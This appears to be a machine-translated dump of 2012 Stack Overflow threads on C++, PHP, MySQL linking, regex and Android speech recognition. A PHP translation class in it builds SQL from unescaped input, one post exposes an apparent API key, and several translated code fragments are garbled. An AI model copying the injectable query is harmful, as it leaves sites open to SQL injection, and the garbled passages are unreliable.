如果您只针对 Windows 系统，您可以使用 ShellExecuteEx 函数（Win32 API 的一部分）。您只需将文件名传递给它，它就会启动已注册的程序来处理该文件类型（就像您从 Windows 资源管理器中打开文件一样）。MSDN 上提供了文档：http: [//msdn.microsoft.com/en-us/library/windows/desktop/bb762154 (v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/bb762154(v=vs.85).aspx)

有一些关于[启动应用程序的示例（ShellExecute、ShellExecuteEx、SHELLEXECUTEINFO）](http://msdn.microsoft.com/en-us/library/windows/desktop/bb776886%28v=vs.85%29.aspx) MSDN 文章以及互联网上其他地方的更多内容。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T19:31:21.423

正如其他人提到的那样，系统函数只执行一个 cmd 命令，.. notepad.exe 默认情况下位于系统的路径中，因此它可以直接工作，但例如，如果我想在我的桌面上打开一个 zip 文件，我d 输入类似的东西

```
"C:\Program Files\7-Zip\7zFM.exe" Desktop\zipfile.zip 
```

那是我当前在我的用户目录 [默认情况下] 的时候，或者

```
"C:\Program Files\7-Zip\7zFM.exe" C:\Users\JiMMaR\Desktop\zipfile.zip 
```

[JiMMaR 是我在 windows 7 上的用户名] 请注意，此特定命令仅适用于 windows ，如果您使用的是其他操作系统，这将无法正常工作

尝试做一个

```
fileNeededtoBeOpened = "\"C:\Program Files\7-Zip\7zFM.exe\" C:\Users\YOUR_USER_NAME\Desktop\zipfile.zip"; 
```

看看是否执行

编辑：如果你无法逃脱空间，那么试试这个

```
fileNeededtoBeOpened = "C:\Program~1\7-Zip\7zFM.exe C:\Users\YOUR_USER_NAME\Desktop\zipfile.zip"; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T19:19:50.527

Ok, firstly - `system` - is a function that starts a separate process to your program. Much the same as in a command window when you type the command. The command lines you provide will be dependent on the applications you want to launch.

> Now, I was wondering if there was a way to open other type of files, such as Microsoft Excel, Microsoft Word, Visual Studio, or 7zip.

Yes I would be pretty shocked if there wasn't a command line parameter you could specify to load a document in these apps at start up. (Ok not shocked, but it is pretty standard)

Does this have anything to do with c++ - not really - you need to look at references for the applications you mention and see what the command lines parameters are for them. Then craft a string and `system(...)` to your hearts content.

# java - Java Applet：以 HTML 格式存档

> ID：13221834
> 
> 赞同：0
> 
> 时间：2012-11-04T19:05:53.237
> 
> 标签：java, applet

我想在我的网页上运行 Java Applet，但是 - 由于网络主机施加的限制 - 我可以访问包含小程序类的 JAR 文件的唯一方法是通过 HTML 链接。这可能吗？如果是这样，我该怎么做？

我尝试做的一个例子：

```
<object type="application/x-java-applet" height="300" width="550">
  <param name="code" value="path.to.class.MyApplet.class" />
  <param name="archive" value="http://www.example.com/path/to/MyJar.jar" />
</object> 
```

一个可能与我的问题相关的事实：applet 类导致显示一个 JFrame。

编辑：我正在使用最新版本的 Chromium for Ubuntu，我认为它支持 HTML5。我也试过用`<archive>`标签来做这件事。

# php - PHP - 页面刷新后出现错误 500

> ID：13221837
> 
> 赞同：0
> 
> 时间：2012-11-04T19:06:27.037
> 
> 标签：php, session, serialization

我有一个 PHP 应用程序，但无法从 SESSION 获取用户对象。

保存对象时，我有以下代码（其他文件）。

```
$_SESSION['user'] = serialize($user); 
```

当我尝试加载一个名为timeline.php 的文件时，问题就开始了。我第一次加载页面时（在我登录并设置了 SESSION['user] 之后）页面工作正常。当我刷新页面时，我收到错误 500。

错误日志显示：

在第 10 行的timeline.php 中调用非对象的成员函数get()。

第 2-10 行的代码是这样的：

```
include_once('isUserLoggedIn.php');
require_once('classes/User.php');

session_start();

$user = unserialize($_SESSION['user']);

require_once('classes/Database.php');
$tweets = Database::getTimeline($user->get('user_id')); 
```

任何人都可以为此提供任何理由吗？

*更新 (1)*

在timeline.php 中，我将var_dump($user) 添加到第8 行。第一次加载页面时，它给了我正确的值。

我第二次加载页面时它给了我 bool(false)。

*更新 (2)*

问题似乎出在主机上（可能是那里的 php.ini 文件中的设置）。我使用的公司是 Fatcow。当我使用别人的主机（1and1）时，问题没有发生。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:12:59.143

反序列化对象时可能会发生很多奇怪的事情，请参阅 PHP 手册页以获取更多信息。

[http://php.net/manual/en/function.unserialize.php](http://php.net/manual/en/function.unserialize.php)

此评论似乎相关： [http ://www.php.net/manual/en/function.unserialize.php#77826](http://www.php.net/manual/en/function.unserialize.php#77826)

# mysql - ld 找不到 libmysqlclient

> ID：13221838
> 
> 赞同：0
> 
> 时间：2012-11-04T19:06:27.677
> 
> 标签：mysql, c, shared-libraries, static-libraries, ld

我记得，几年前，当我开始使用 mySQL 时，“就这样”设置东西以便找到库（尤其是 mySQL 库！）是一场噩梦。就我而言，我相信 ldconfig 是解决问题的工具。快进到 2012 年——刚刚安装了一个新的“主”系统，其中包括 64 位 Ubuntu 12.04，我正在确保我的所有源代码都能编译。想象一下我很惊讶我又回到了与 libmysqlclient 同一条船上。

我的网络搜索显示了很多可以尝试的内容，但没有任何帮助。一路上，我发现了这个技巧：gcc ... `mysql_config --cflags --libs`- 非常好，但这并没有帮助。

因此，例如，结果：

```
gcc -D_FILE_OFFSET_BITS=64 `mysql_config --cflags --libs` \
            -o check-my-ip \
            -s check-my-ip.c ../common/ini-file.c 
```

是

```
 /tmp/ccxAgCqr.o: In function `updateTables':
 /usr/local/src/check-my-ip/check-my-ip.c:373: undefined reference to `mysql_init'
 /usr/local/src/check-my-ip/check-my-ip.c:374: undefined reference to `mysql_real_connect'
 /usr/local/src/check-my-ip/check-my-ip.c:381: undefined reference to `mysql_error'
 /usr/local/src/check-my-ip/check-my-ip.c:381: undefined reference to `mysql_errno'
 /usr/local/src/check-my-ip/check-my-ip.c:397: undefined reference to `mysql_field_count'
 /usr/local/src/check-my-ip/check-my-ip.c:398: undefined reference to `mysql_use_result'
 /usr/local/src/check-my-ip/check-my-ip.c:399: undefined reference to `mysql_fetch_row'
 /usr/local/src/check-my-ip/check-my-ip.c:419: undefined reference to `mysql_free_result'
 /usr/local/src/check-my-ip/check-my-ip.c:422: undefined reference to `mysql_field_count'
 /usr/local/src/check-my-ip/check-my-ip.c:429: undefined reference to `mysql_close'
 /tmp/ccxAgCqr.o: In function `myQuery':
 /usr/local/src/check-my-ip/check-my-ip.c:439: undefined reference to `mysql_query'
 /usr/local/src/check-my-ip/check-my-ip.c:441: undefined reference to `mysql_error'
 /tmp/ccxAgCqr.o: In function `indexExists':
 /usr/local/src/check-my-ip/check-my-ip.c:464: undefined reference to `mysql_field_count'
 /usr/local/src/check-my-ip/check-my-ip.c:465: undefined reference to `mysql_use_result'
 /usr/local/src/check-my-ip/check-my-ip.c:466: undefined reference to `mysql_fetch_row'
 /usr/local/src/check-my-ip/check-my-ip.c:471: undefined reference to `mysql_free_result'
 collect2: ld returned 1 exit status
 make: *** [check-my-ip] Error 1 
```

mysql_config --cflags --libs 的输出是：

```
-I/usr/include/mysql -DBIG_JOINS=1  -fno-strict-aliasing  -g
-L/usr/lib/x86_64-linux-gnu -lmysqlclient -lpthread -lz -lm -lrt -ldl 
```

这些是其他一些可能有助于诊断的命令：

$ ldconfig -p | grep mysql

```
 libmysqlclient.so.18 (libc6,x86-64) => /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18
    libmysqlclient.so (libc6,x86-64) => /usr/lib/x86_64-linux-gnu/libmysqlclient.so

 $ ls -l /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18
 lrwxrwxrwx 1 root root 24 Jun 11 10:21 /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18 -> libmysqlclient.so.18.0.0
 $ ls -l /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18.0.0
 -rw-r--r-- 1 root root 3408136 Jun 11 10:21 /usr/lib/x86_64-linux-gnu/libmysqlclient.so.18.0.0 
```

我做了一个`aptitude search libmysql`并注意到有 37 行，其中大多数具有 i386 名称（例如：libmysqld-pic:i386），我注意到该输出中有零行带有 x86_64（或 -64）；这是问题的一部分吗？（这里是那 37 行）

```
 $ aptitude search libmysql
 p   libmysql++-dev                            - MySQL C++ library bindings (development)
 p   libmysql++-dev:i386                       - MySQL C++ library bindings (development)
 p   libmysql++-doc                            - MySQL C++ library bindings (documentation and exampl
 p   libmysql++3                               - MySQL C++ library bindings (runtime)
 p   libmysql++3:i386                          - MySQL C++ library bindings (runtime)
 p   libmysql-cil-dev                          - MySQL database connector for CLI
 p   libmysql-diff-perl                        - module for comparing the table structure of two MySQ
 p   libmysql-java                             - Java database (JDBC) driver for MySQL
 p   libmysql-ocaml                            - OCaml bindings for MySql
 p   libmysql-ocaml:i386                       - OCaml bindings for MySql
 p   libmysql-ocaml-dev                        - OCaml bindings for MySql
 p   libmysql-ocaml-dev:i386                   - OCaml bindings for MySql
 v   libmysql-ocaml-dev-dnim6:i386             -
 v   libmysql-ocaml-dev-jygp6                  -
 v   libmysql-ocaml-dnim6:i386                 -
 v   libmysql-ocaml-jygp6                      -
 p   libmysql-ruby                             - Transitional package for ruby-mysql
 v   libmysql-ruby:i386                        -
 p   libmysql-ruby1.8                          - Transitional package for ruby-mysql
 v   libmysql-ruby1.8:i386                     -
 p   libmysql-ruby1.9.1                        - Transitional package for ruby-mysql
 v   libmysql-ruby1.9.1:i386                   -
 p   libmysql6.4-cil                           - MySQL database connector for CLI
 i   libmysqlclient-dev                        - MySQL database development files
 p   libmysqlclient-dev:i386                   - MySQL database development files
 v   libmysqlclient15-dev                      -
 v   libmysqlclient15-dev:i386                 -
 i A libmysqlclient18                          - MySQL database client library
 p   libmysqlclient18:i386                     - MySQL database client library
 p   libmysqlcppconn-dev                       - MySQL Connector for C++ (development files)
 p   libmysqlcppconn-dev:i386                  - MySQL Connector for C++ (development files)
 p   libmysqlcppconn5                          - MySQL Connector for C++ (library)
 p   libmysqlcppconn5:i386                     - MySQL Connector for C++ (library)
 i   libmysqld-dev                             - MySQL embedded database development files
 p   libmysqld-dev:i386                        - MySQL embedded database development files
 p   libmysqld-pic                             - MySQL database development files
 p   libmysqld-pic:i386                        - MySQL database development files 
```

这是/usr/lib/mysql的内容

```
$ find /usr/lib/mysql
/usr/lib/mysql
/usr/lib/mysql/plugin
/usr/lib/mysql/plugin/qa_auth_client.so
/usr/lib/mysql/plugin/auth.so
/usr/lib/mysql/plugin/qa_auth_server.so
/usr/lib/mysql/plugin/semisync_master.so
/usr/lib/mysql/plugin/libdaemon_example.so
/usr/lib/mysql/plugin/ha_example.so
/usr/lib/mysql/plugin/adt_null.so
/usr/lib/mysql/plugin/auth_test_plugin.so
/usr/lib/mysql/plugin/auth_socket.so
/usr/lib/mysql/plugin/qa_auth_interface.so
/usr/lib/mysql/plugin/semisync_slave.so
/usr/lib/mysql/plugin/mypluglib.so 
```

我不知道还有什么可以尝试的，还有什么可以看的，并且希望得到任何指示。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T19:22:16.893

链接器标志应始终最后指定：

```
gcc -D_FILE_OFFSET_BITS=64 `mysql_config --cflags` \
        -o check-my-ip \
        -s check-my-ip.c ../common/ini-file.c \
        `mysql_config --libs` 
```

# c# - 需要调用/关闭在其他 PC 上运行的程序

> ID：13221840
> 
> 赞同：0
> 
> 时间：2012-11-04T19:06:43.087
> 
> 标签：c#

我们有自己的各种类型的小型应用程序服务器，它们只是 exe 文件。这些应用程序服务器在各种机器上运行，我需要一种机制来启动/结束应用程序服务器，而无需访问运行应用程序服务器的每台 PC。我需要的是：

1.  我将为每台运行应用服务器的 PC 安装一个客户端应用程序，并且会有一个服务器应用程序可用于监控在各种 PC 上运行的应用服务器。

2.  在客户端上，我们可以指定各种应用服务器的位置（只是 exe 文件）及其友好名称。（如 c:\app1.exe,Myapp;d:\Myotherapp,OtherApp）。

3.  在服务器上，当输入 IP 地址或主机名时，它会向客户端发送一个请求，客户端将回复它能够运行的应用服务器（MyApp、OtherApp），并且最初会报告它们的状态已停止。当为特定的应用服务器按下服务器上的启动按钮时，它将向客户端发送一条消息以启动指定的应用服务器。客户端上运行的应用服务器的状态将定期刷新（通过交换上述消息）

4.  如果其他服务器启动并指向同一个客户端，它将报告客户端上运行了 2 个应用程序服务器，其中一个已启动。当按下停止按钮时，它将在客户端发送消息以停止特定的应用服务器。

我最初想到使用这种技术：

1.  当服务器希望任何特定的 PC 启动其应用服务器时，它只会在数据库表中创建一个条目。

2.  客户端定期嗅探表，当它看到创建了一个条目时，它将启动程序。

但是这种技术很差，因为它使用轮询，客户端将继续查询数据库。我想要一个推送类型的消息。

套接字编程会解决这个任务还是有什么简单的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:36:12.400

你可以试试[nvents](http://nvents.org/)。我相信它有你正在寻找的东西。这将允许您只使用 TCP 端口上的 WCF 通过网络订阅事件，而不必不断地轮询数据库。

# error-handling - com.google.android.voicesearch.speechservice.ConnectionException：无法建立连接

> ID：13221843
> 
> 赞同：0
> 
> 时间：2012-11-04T19:06:49.327
> 
> 标签：error-handling, speech-recognition, voice, voice-recognition

我正在测试一个进行语音识别的应用程序，但现在我收到了这个错误：

```
11-04 16:25:58.249: E/ServerConnectorImpl(13716): Failed to create TCP connection
11-04 16:25:58.249: E/ServerConnectorImpl(13716): com.google.android.voicesearch.speechservice.ConnectionException: Failed to establish connection
11-04 16:25:58.249: E/ServerConnectorImpl(13716):   at com.google.android.voicesearch.tcp.TcpConnectionImpl.<init>(TcpConnectionImpl.java:87)
.... 
```

这是我的代码：

```
sr = SpeechRecognizer.createSpeechRecognizer(getApplicationContext());
MyRecognition listener = new MyRecognition();
sr.setRecognitionListener(listener); 
```

实现来自 RecognitionListener 的方法的 MyRecognition 类

```
class MyRecognition implements RecognitionListener{
    public void onBeginningOfSpeech() {

    }
    public void onBufferReceived(byte[] buffer) {

}
    public void onEndOfSpeech() {

}
    public void onError(int error) {
        MediaPlayer mp = new MediaPlayer();
            AssetFileDescriptor asset;
            try {
                asset = getAssets().openFd("error.mp3");
                mp.setDataSource(asset.getFileDescriptor(), asset.getStartOffset(), asset.getLength());
                asset.close();
                mp.prepare();
                mp.start();

                mp.setOnCompletionListener(AddActivity.this);
            } catch (IOException e) {
                e.printStackTrace();
            }
    }
    ....
    public void onResults(Bundle results) {
        ....
    }
    .... 
} 
```

实现语音识别的方法

```
private void reconheceVoz(final MediaPlayer mp){
    try{
        Intent intent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
        intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM);
        intent.putExtra(RecognizerIntent.EXTRA_CALLING_PACKAGE, "com.br.test");
        intent.putExtra(RecognizerIntent.EXTRA_MAX_RESULTS, 5);
        sr.startListening(intent);

        mp.release();
    }
    catch(Exception e){
        Toast.makeText(AdicaoActivity.this, "Erro: " + e.getMessage(), Toast.LENGTH_SHORT).show();
    }
} 
```

这个错误经常发生？我该如何治疗？

谢谢。

# c - fscanf 和换行符

> ID：13221844
> 
> 赞同：14
> 
> 时间：2012-11-04T19:07:04.023
> 
> 标签：c, regex, file-io

我有 fscanf 从配置文件中读取设置行。这些设置具有严格预定义的格式，看起来像

```
name1=option1;
name2=option2;
... 
```

所以基本上我会

```
fscanf(configuration,"%[^=]=%[^;];",name,option); 
```

其中配置是文件流，名称和选项是编程缓冲区。

问题是名称缓冲区包含我不想要的换行符。我在“[^...]”设置中错过了格式说明符以跳过换行符吗？无论如何，它可以通过格式说明符解决吗？

顺便说一句：通过写这个来吞下换行符

```
"%[^=]=%[^;];\n" 
```

我认为这并不优雅，因为换行符可以在任何地方重复多次。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-04T19:16:53.557

只需在格式字符串的末尾添加空格：

```
"%[^=]=%[^;]; " 
```

This will eat all whitespace characters, including new-lines.

Quotation from [cplusplus.com](http://www.cplusplus.com/reference/clibrary/cstdio/fscanf/):

> Whitespace character: the function will read and ignore any whitespace characters encountered before the next non-whitespace character (whitespace characters include spaces, newline and tab characters -- see isspace). A single whitespace in the format string validates any quantity of whitespace characters extracted from the stream (including none).

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-04T19:28:34.523

An alternative is to use `fgets()` to read the entire line into a string, then use `sscanf()`. This has an advantage in debugging in that you can see exactly what data the function is working on.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T19:14:55.337

这将起作用：

`fscanf(configuration,"%[^=]=%[^;];%[^\n]",name,option,dummy);`

您将不得不使用换行符。否则，换行符将留在输入流中。

# javascript - 用户登录时如何从后端省略确认表单重新提交

> ID：13221847
> 
> 赞同：0
> 
> 时间：2012-11-04T19:07:27.593
> 
> 标签：javascript, asp.net-mvc, azure, acs

我有这个问题，我很难解释，但我希望它是有道理的。

问题是，当用户登录时，我正在使用 MVC 4 Asp.Net 并使用 Azure ACS 声明进行身份验证。重定向到

1.  ACS 启动
2.  ACS 将数据回传到服务器
3.  页面已加载（网络工具显示其 POST 方法）

现在，如果用户刷新页面，弹出窗口会询问 Confirm Form Resubmission。我认为这是因为该站点是一个 POST，所以它认为它应该重新发送这些东西。

无论如何，是否可以将其更改为普通的 GET 而不是用户从 ACS 返回时获得的 POST？

我希望我的问题是有道理的，我不确定要寻找什么来找到解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:10:26.480

你会想要使用[Post/Redirect/Get](http://en.wikipedia.org/wiki/Post/Redirect/Get)。

# java - Java中的马尔可夫聚类算法

> ID：13221848
> 
> 赞同：5
> 
> 时间：2012-11-04T19:07:44.743
> 
> 标签：java, graph, cluster-analysis

Java中是否有任何开源[马尔可夫聚类算法](http://www.micans.org/mcl/)（又名MCL）实现？独立的或库的一部分。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T19:14:30.230

这个[实现](http://java-ml.sourceforge.net/api/0.1.1/net/sf/javaml/clustering/mcl/MarkovClustering.html)包含在[java-ml](http://java-ml.sourceforge.net/)库中。

# php - 通过数组的php api

> ID：13221849
> 
> 赞同：0
> 
> 时间：2012-11-04T19:07:47.567
> 
> 标签：php, arrays, api

我正在尝试读取返回数组的脚本 api：

```
$api_key = "Uez4TWYH6OAQQHoUcICWJ8UUFYmwQ";
$file_id = "LNzcOp2b1352047884";
$ch=curl_init(); 
curl_setopt($ch,CURLOPT_URL,'http://ads.ngsms.tk/api/info.php?api_key='.$api_key.'&file_id='.$file_id); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$api = curl_exec($ch); $api = print_r($api); 
Echo $api['file_id']; 
```

以上显示：

```
Array ( 
   [file_id] => LNzcOp2b1352047884 
   [file_name] => sic_ftp_3rda.sisx 
   [file_type] => application/octet-stream 
   [file_size] => 65144
) 
```

如何获取 file_name 和其他值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:11:56.447

要获取数组中的任何值，请以与 file_id 相同的方式引用它，但将键替换为您之后的值，例如：

```
$api['file_id'];
$api['file_name'];
$api['file_type'];
$api['file_size']; 
```

然后要简单地在页面上显示它，您可以使用 echo：

```
echo    $api['file_id'];
echo    $api['file_name'];
echo    $api['file_type'];
echo    $api['file_size']; 
```

所以你的完整代码是：

```
 <?php
$api_key = "Uez4TWYH6OAQQHoUcICWJ8UUFYmwQ";
$file_id = "LNzcOp2b1352047884";
$ch=curl_init(); 
curl_setopt($ch,CURLOPT_URL,'http://ads.ngsms.tk/api/info.php?api_key='.$api_key.'&file_id='.$file_id); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$api = curl_exec($ch); 
//print_r($api);
$fileid = get_string_between($api, "[file_id] => ", "[file_name] ");
$filename = get_string_between($api, " [file_name] => ", " [file_type] => ");
$filetype = get_string_between($api, " [file_type] => ", " [file_size] =>");
$filesize = get_string_between($api, " [file_size] => ", ")");
echo "ID: $fileid <br /> name: $filename <br />type: $filetype   <br /> size: " .$filesize;
function get_string_between($string, $start, $end){
    $string = " ".$string;
    $ini = strpos($string,$start);
    if ($ini == 0) return "";
    $ini += strlen($start);
    $len = strpos($string,$end,$ini) - $ini;
    return substr($string,$ini,$len);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T19:10:58.910

我想到的最简单的解决方案与已经是最后一个命令的解决方案完全相同。

```
echo $api['file_name'] // to print it
$file_name = $api['file_name']; 
```

从. `$api =`_`print_r`

# python - 非贪婪的python正则表达式

> ID：13221859
> 
> 赞同：3
> 
> 时间：2012-11-04T19:08:35.943
> 
> 标签：python, regex, non-greedy

我正在尝试通过一些正则表达式来解决问题；我正在使用python。

我现在的任务是抓取报纸文章并寻找人们死亡的实例。一旦我有一篇相关的文章，我就会尝试为其他一些事情计算死亡人数。我正在尝试提出一些模式，但特别是我遇到了困难。获取此示例文章部分：

> 萨那，10 月 21 日（路透社）——部落消息人士和当地官员说，周日，美国无人机在也门对一辆汽车发动明显袭击，导致三名被认为是基地组织武装分子的男子丧生。

我用来捕获“三”的代码首先对整个文档进行替换，以便在应用任何模式之前，“三”变为“3”。与此示例相关的模式是这样的：

```
re.compile(r"(\d+)\s(:?men|women|children|people)?.*?(:?were|have been)? killed") 
```

这个想法是这个模式将以一个数字开头，后跟一个可选名词，例如列出的名词之一，然后在找到“死亡”或“死亡”之前有最少的混乱。我想留出空间，以便这种模式能够捕捉到：

```
3 people have been killed since Sunday 
```

并且仍然捕获示例中的实例：

```
3 men thought to be al qaeda militants were killed 
```

问题是我使用的模式是从文章的第一部分收集日期，并返回 21 的计数。到目前为止，没有多少摆弄使我能够将范围限制在 men 旁边的数字，然后是分词短语，然后是相关的“被杀”。

任何帮助将非常感激。在 RE 方面，我绝对不是专家。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T19:12:55.777

不要做`men|women|children`可选项，即去掉右括号后的问号。正则表达式引擎将在第一个可能的位置匹配，无论重复运算符是贪婪还是吝啬。

或者，或者另外，使“这里的任何东西”模式只匹配非数字，即替换`.*?`为`\D*?`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T19:13:59.707

这是因为，您使用了量词`?`，它与您的数字匹配或`0`匹配。所以，会匹配。因为它有他们。`1``(:?men|women|children|people)``21``0`

尝试在它之后删除你的量词，以完全匹配其中一个： -

```
re.compile(r"(\d+)\s(?:men|women|children|people).*?(?:were|have been)? killed") 
```

**更新**： - 要使用`? quantifier`并仍然获得所需的结果，您需要使用正则`Look-Ahead`表达式，以确保您`digit`的后面没有包含`hiephen(-)`示例中包含的字符串。

```
re.compile(r"(\d+)(?!.*?-.*?)\s(?:men|women|children|people)?.*?(?:were|have been)? killed") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T19:14:53.230

你使用**了错误的语法** `(:?...)`。您可能想使用`(?:...)`.

* * *

使用正则表达式模式

```
(\d+).*?\b(?:men|women|children|people|)\b.*?\b(?:were|have been|)\b.*?\bkilled\b 
```

或者如果这些单词之间只允许空格，那么

```
(\d+)\s+(?:men|women|children|people|)\s+(?:were|have been|)\s+killed\b 
```

# php - Apache关闭后的PHP？

> ID：13221860
> 
> 赞同：3
> 
> 时间：2012-11-04T19:09:17.417
> 
> 标签：php, apache, centos

我在 CentOS 上运行 Apache 服务器，并希望能够使用以下命令从受保护的页面重新启动网络服务器：

PHP：

```
<?php
ignore_user_abort(true);
shell_exec('sh sh/restart.sh');
?> 
```

重启.sh：

```
service httpd restart 
```

我的问题是如果 web 服务器关闭并且 PHP 停止执行，sh 脚本会继续运行以使 web 服务器重新联机吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:18:27.157

If your PHP runs as apache module, then once you kill httpd your script will be terminated instantly. So you need to delegate restart to i.e. command line script (called using `exec()` or `shell_exec()`)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T19:13:25.893

你应该没问题，因为 Apache 直到发出命令后才会关闭。但是，如果您真的想要安全，请使用[nohup](http://en.wikipedia.org/wiki/Nohup)：

```
shell_exec('nohup sh sh/restart.sh'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-05T03:02:36.913

您也许可以在命令末尾添加一个 & 。这将分叉该进程并在后台运行它。这样它就不会依赖于仍在运行的 apache。

```
shell_exec('sh sh/restart.sh &'); 
```

如果这可行，则不需要 ignore_user_abort()。

# php - PDO fetchall() 性能注意事项？

> ID：13221861
> 
> 赞同：8
> 
> 时间：2012-11-04T19:09:24.900
> 
> 标签：php, mysql, pdo

在阅读了几篇关于 PHP 的 PDO`fetchall()`函数的性能影响的文章后，我很好奇是否有另一种方法可以在不调用`fetchall()`.

为了解释，大多数人同意这`fetchall()`往往是资源密集型的。就我而言，我认为这不会是一个太大的问题。是的，我必须从我的数据库中提取整个表并将其显示给用户，但它最多只有 100 行；我不相信这将是一个问题。但是，假设我需要提取 100,000 行，那么什么是更优化的解决方案？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-04T21:06:29.033

假设，如果您需要在单个响应中输出所有 100,000 行，您应该设置`PDO::MYSQL_ATTR_USE_BUFFERED_QUERY`为，执行查询，并使用[fetch](http://www.php.net/manual/en/pdostatement.fetch.php)`false`一次迭代一行结果集。详细地说，无论您是否调用 fetchAll() 如果设置为 true，php 都会缓冲整个结果集。`PDO::MYSQL_ATTR_USE_BUFFERED_QUERY`

好处是您大大减少了脚本的最大内存消耗，并且您可以更快地开始流式输出，尽管完成的总时间可能会或可能不会花费更长的时间。

我忽略了在这种极端情况下你应该考虑的其他事情，比如输出缓冲等......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T19:55:48.200

另一种方法是在循环中逐行获取，如下所示：

```
while( $row = $statement->fetch() ){
    // so something with $row
} 
```

显然，如果您需要所有行，例如用它们计算一些统计数据，那么上述方法不起作用。但是，在许多情况下，SQL 提供的解决方案允许您即时计算此类统计信息，并仅返回结果。

# php - 当有 __construct() 元素时将类转换为函数

> ID：13221863
> 
> 赞同：4
> 
> 时间：2012-11-04T19:09:29.563
> 
> 标签：php, oop, class, function

我正在（不断地）学习 PHP，并且前段时间我创建了一个处理翻译的类。我想[模拟 gettext](http://www.codinghorror.com/blog/2009/02/dont-reinvent-the-wheel-unless-you-plan-on-learning-more-about-wheels.html)但从数据库中获取翻译后的字符串。但是，现在我再次看到它，我不喜欢这样，作为一个班级，我需要使用`$Translate->text('String_keyword');`. 我不想使用任何一个，`$T->a('String_keyword');`因为这完全不直观。

我一直在思考如何使用简单`_('String_keyword')`的 gettext 样式调用它，但是，从我从 SO 中学到的东西，我还没有找到一个“好”的方法来实现这一点。我需要以某种方式将默认语言传递给函数，我不想每次调用它时都传递它`_('String_keyword', $User->get('Language'))`）。我也不想在`_()`函数中包含用户检测脚本，因为它只需要运行一次而不是每次都运行。

最简单的方法是使用 GLOBALS，但我在这里了解到它们是完全被禁止的（这可能是我[可以使用它们的唯一情况吗？](http://c2.com/cgi/wiki?GlobalVariablesAreBad)），然后我想用用户的语言[定义](http://php.net/manual/en/function.define.php)一个变量，例如`define ( USER_LANGUAGE , $User->get('Language') )`，但它似乎与全局相同。这些是我可以看到的两个主要选项，我知道还有其他一些方法，例如依赖注入，但它们似乎为如此简单的请求增加了太多的复杂性，我还没有时间深入研究它们。

我正在考虑首先创建一个包装器来测试它。像这样的东西：

```
function _($Id, $Arg = null)
  {
  $Translate = new Translate (USER_LANGUAGE);
  return $Translate -> text($Id, $Arg)
  } 
```

这是翻译代码。语言在之前被检测并在创建时传递给对象。

```
// Translate text strings
// TO DO: SHOULD, SHOULD change it to PDO! Also, merge the 2 tables into 1
class Translate
  {
  private $Lang;

  function __construct ($Lang)
    {
    $this->Lang = $Lang;
    }

  // Clever. Adds the translation so when codding I don't get annoyed.
  private function add ($Id, $Text)
    {
    $sql="INSERT INTO htranslations (keyword, en, page, last) VALUES ('$Id', '$Text', '".$_SERVER['PHP_SELF']."', now())";

    mysql_query($sql);
    }

  private function retrieve ( $Id )
    {
    $table = is_int ($Id) ? "translations" : "htranslations";      // A small tweak to support the two tables, but they should be merged.
    $results = mysql_query ("SELECT ".mysql_real_escape_string($this->Lang)." FROM ".$table." WHERE keyword='".mysql_real_escape_string($Id)."'");
    $row = mysql_fetch_assoc ($results);
    return mysql_num_rows ($results) ? stripslashes ($row[$this->Lang]) : null;
    }

  // If needed to insert a name, for example, pass it in the $Arg
  public function text($Id, $Arg = null)
    {
    $Text = $this->retrieve($Id);
    if (empty($Text))
      {
      $Text = str_replace("_", " ", $Id);  // If not found, replace all "_" with " " from the input string.
      $this->add($Id, $Text);
      }
    return str_replace("%s", $Arg, $Text);    // Not likely to have more than 2 variables into a single string.
    }
  } 
```

**您将如何以适当而简单（用于编码）的方式完成此任务？**任何建议的方法是否有效，或者您能提供更好的方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T19:24:03.363

如果问题仅仅是这样

```
$Translate->text('String_keyword'); 
```

感觉很长，然后考虑通过实现将 Translate 对象变成 Functor [`__invoke`](http://php.net/manual/en/language.oop5.magic.php#object.invoke)：

```
class Translate
{
    // all your PHP code you already have

    public function __invoke($keyword, $Arg = null)
    {
        return $this->text($keyword, $Arg)
    }
} 
```

然后，您可以使用所有必需的依赖项和设置定期实例化对象并调用它：

```
$_ = new Translate(/* whatever it needs */);
echo $_('Hallo Welt'); 
```

这不会像您当前考虑通过包装函数或其他地方建议的 Registry/Singleton 解决方案那样引入与全局范围相同数量的耦合和摆弄。唯一的缺点是对象变量的非口语命名为`$_()`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T19:15:34.540

我会使用注册表或制作`Translate`单例。当我第一次初始化它时，我会传递在请求的引导阶段不会出现的语言。然后，如有必要，我将添加稍后更改语言的方法。

